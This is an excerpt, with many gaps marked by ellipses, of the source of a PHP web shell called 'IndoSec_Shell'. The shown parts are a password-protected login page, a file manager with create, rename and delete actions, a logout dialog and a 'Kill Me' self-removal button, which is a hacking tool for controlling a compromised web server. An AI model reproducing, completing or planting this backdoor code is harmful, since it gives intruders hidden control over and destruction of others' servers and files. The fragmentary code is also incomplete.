...
<html lang="en">
  <head>
    ...
    <title>HAYU KANG DI LOGIN</title>
    <link rel="canonical" href="https://getbootstrap.com/docs/4.0/examples/sign-in/">
    <link href="https://getbootstrap.com/docs/4.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://getbootstrap.com/docs/4.0/examples/sign-in/signin.css" rel="stylesheet">
  </head>

  <body class="text-center" style="background-color: rgb(52,58,64); color: white;" >
    <form class="form-signin" method="post">
      <h1 class="h3 mb-3 font-weight-normal">{ IndoSec_Shell }</h1>
      <label for="inputPassword" class="sr-only" >Password</label>
      <input type="password" id="inputPassword" class="form-control" placeholder="Password" name="password" required>
      <button class="btn btn-lg btn-danger btn-block" type="submit">Login!</button>
      <p class="mt-5 mb-3 text-muted">IndoSec &copy; <?php echo date('D.d.M.Y')?></p>
    </form>
  </body>
</html>
...
<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.0-1/css/all.css" crossorigin="anonymous">
</head>
...
<font color="white">
	...
	foreach($dir as $folder) {
		...
		$dirinfo['action']= ($folder === '.' || $folder === '..') ? "<a class='a' href='?act=newfile&dir=".path()."'><i class='fa fa-plus'></i> File</a> | <a href='?act=newfolder&dir=".path()."'><i class='fa fa-plus'> Folder</i></a>" : "<a href='?act=rename_folder&dir=".$dirinfo['path']."'><i class='fa fa-pencil-alt'></i> Rename</a> | <a href='?act=delete_folder&dir=".$dirinfo['path']."'><i class='fa fa-trash'></i> Delete</a>";
...
<div class="modal fade" id="logout" tabindex="-2" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel"><font color='black'>Logout ? </font></h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      	...
      	<button class="btn btn-danger" name="logout">OUT !</button>
      </form>
      	<button class="btn btn-secondary" name="back" data-dismiss="modal" aria-label="Close">Back</button>
    </div>
  </div>
</div>
...
<div class="modal fade" id="kill" tabindex="-2" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel"><font color='black'>Kill Me ? </font></h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      	<div class="modal-footer">
      		<form method="post" target="">
      	<button class="btn btn-danger" name="kill">KILL ME!</button>
      </form>
      	<button class="btn btn-secondary" name="back" data-dismiss="modal" aria-label="Close">Back</button>
    </div>
  </div>
...
<div class="col-md-12 mt-4">
	<div class="card text-center bg-light about">
		...
		<div class="card-footer">
			<small class="card-text text-muted">Copyright 2020 { IndoSec }</small>
		</div>
	</div>
	<br>
</div>
